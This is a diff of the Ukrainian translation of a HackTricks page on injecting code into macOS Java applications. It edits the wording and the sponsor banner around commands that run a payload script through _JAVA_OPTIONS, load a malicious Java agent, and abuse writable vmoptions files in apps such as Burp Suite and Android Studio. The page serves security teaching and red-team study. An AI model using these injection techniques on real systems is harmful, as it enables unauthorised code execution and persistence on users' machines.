@@ -1,22 +1,23 @@
-# Внедрення Java-додатків macOS
+# macOS Java Applications Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Перелік
+## Enumeration
 
-Знайдіть встановлені Java-додатки у вашій системі. Було помічено, що Java-додатки в **Info.plist** будуть містити деякі параметри Java, які містять рядок **`java.`**, тому ви можете шукати це:
+Знайдіть Java-додатки, встановлені у вашій системі. Було помічено, що Java-додатки в **Info.plist** міститимуть деякі параметри java, які містять рядок **`java.`**, тому ви можете шукати це:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Змінна середовища **`_JAVA_OPTIONS`** може бути використана для впровадження довільних параметрів Java у виконання скомпільованої програми Java:
+Змінна середовища **`_JAVA_OPTIONS`** може бути використана для ін'єкції довільних параметрів java під час виконання скомпільованого java додатку:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Для виконання його як нового процесу, а не як дитини поточного терміналу, ви можете використовувати:
+Щоб виконати це як новий процес, а не як дочірній процес поточного терміналу, ви можете використовувати:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Проте це спричинить помилку в виконуваній програмі, інший, більш прихований спосіб - створити java-агент і використовувати:
+Однак це викличе помилку в виконуваному додатку, інший, більш прихований спосіб - створити java-агента і використовувати:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -119,7 +120,7 @@ err.printStackTrace();
 ```
 {% endcode %}
 
-Для компіляції агента виконайте:
+Щоб скомпілювати агент, виконайте:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -131,7 +132,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-І потім експортуйте змінну середовища та запустіть java-додаток так:
+А потім експортуйте змінну середовища та запустіть java-додаток так:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -140,12 +141,12 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## Файл vmoptions
+## vmoptions файл
 
-Цей файл підтримує вказівку **параметрів Java** при виконанні Java. Ви можете скористатися деякими попередніми трюками, щоб змінити параметри Java та **змусити процес виконати довільні команди**. \
-Більше того, цей файл також може **включати інші файли** з допомогою директиви `include`, тому ви також можете змінити включений файл.
+Цей файл підтримує специфікацію **Java параметрів** під час виконання Java. Ви можете використовувати деякі з попередніх трюків, щоб змінити java параметри та **змусити процес виконувати довільні команди**.\
+Більше того, цей файл також може **включати інші** за допомогою директорії `include`, тому ви також можете змінити включений файл.
 
-Ще більше, деякі Java-додатки будуть **завантажувати більше одного файлу `vmoptions`**.
+Ще більше, деякі Java додатки **завантажать більше ніж один `vmoptions`** файл.
 
 Деякі програми, такі як Android Studio, вказують у своєму **виводі, де вони шукають** ці файли, наприклад:
 ```bash
@@ -158,7 +159,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Якщо вони цього не роблять, ви легко можете перевірити це за допомогою:
+Якщо вони цього не роблять, ви можете легко перевірити це за допомогою:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,4 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Зверніть увагу, що в цьому прикладі Android Studio намагається завантажити файл **`/Applications/Android Studio.app.vmoptions`**, місце, де будь-який користувач з групи **`admin` має право на запис.**
+Зверніть увагу, як цікаво, що Android Studio в цьому прикладі намагається завантажити файл **`/Applications/Android Studio.app.vmoptions`**, місце, де будь-який користувач з групи **`admin` має доступ на запис.**
